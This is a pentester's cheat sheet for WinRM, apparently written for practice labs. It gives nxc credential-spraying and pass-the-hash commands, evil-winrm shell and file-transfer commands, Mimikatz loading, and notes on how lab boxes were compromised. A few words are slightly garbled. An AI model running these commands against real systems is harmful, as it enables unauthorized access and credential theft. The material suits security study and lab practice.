# WinRM - Port 5985 (HTTP) / 5986 (HTTPS)

## Test Credentials

```bash
nxc winrm $IP -u user -p password
nxc winrm $IP -u user -H NTLM_HASH
nxc winrm $IP -u users.txt -p REDACTED --continue-on-success
```

## Connect with Evil-WinRM

```bash
# With password
evil-winrm -i $IP -u user -p password

# With NTLM hash
evil-winrm -i $IP -u user -H NTLM_HASH

# With SSL (port 5986)
evil-winrm -i $IP -u user -p password -S
```

## File Transfer (Inside Evil-WinRM)

```bash
upload /local/path/file.exe
download C:\Users\user\file.txt /local/path/
```

## PowerShell Script Loading

```bash
# Load script into session
evil-winrm -i $IP -u user -p password -s /opt/scripts/

# Then inside session
*Evil-WinRM* PS> Invoke-Mimikatz.ps1
*Evil-WinRM* PS> Invoke-Mimikatz
```

## Tips

- WinRM requires user to be in **Remote Management Users** group (or Administrators).
- If nxc shows `Pwn3d!` — you have admin access.
- Evil-WinRM gives a full PowerShell session — can run any PS command.
- Port 5985 = HTTP, Port 5986 = HTTPS.
- Pass-the-hash works natively with evil-winrm.

## See Also

- [[AD-Methodology]] | [[Nmap]] | [[File-Transfers]]

## From Your Boxes

> **Forest** (HTB) — Evil-WinRM with service account for initial shell. Later pass-the-hash to admin.
> - What worked: evil-winrm -i TARGET_IP -u svc-alfresco -p REDACTED then -H REDACTED_HASH as administrator
> - Lesson: WinRM is often the fastest path once you have valid creds. PtH works natively.

> **Sauna** (HTB) — WinRM used at multiple stages: initial access, lateral, final admin via PtH after DCSync.
> - What worked: password auth first, then evil-winrm -i TARGET_IP -u administrator -H REDACTED_HASH
> - Lesson: Test every new credential set against WinRM. Both password and hash auth matter.

> **Remote** (HTB) — Admin creds recovered from TeamViewer registry decryption, confirmed with nxc (Pwn3d!), shell via evil-winrm.
> - What worked: 
xc winrm TARGET_IP -u administrator -p REDACTED then evil-winrm
> - Lesson: Always validate with nxc before connecting.

> **Vault** (PG/Windows) — WinRM after cracking NTLMv2 from SMB share. Used evil-winrm upload for SharpGPOAbuse.
> - What worked: evil-winrm -u user -p REDACTED -i TARGET_IP then upload tool.exe
> - Lesson: Built-in upload/download beats standing up HTTP servers mid-engagement.

> **Monteverde** (HTB) — Evil-WinRM after creds in zure.xml on SMB. Ran Azure AD Connect extract via WinRM.
> - What worked: full PowerShell session to run privesc scripts in-place
> - Lesson: WinRM is a transfer channel and an execution channel.

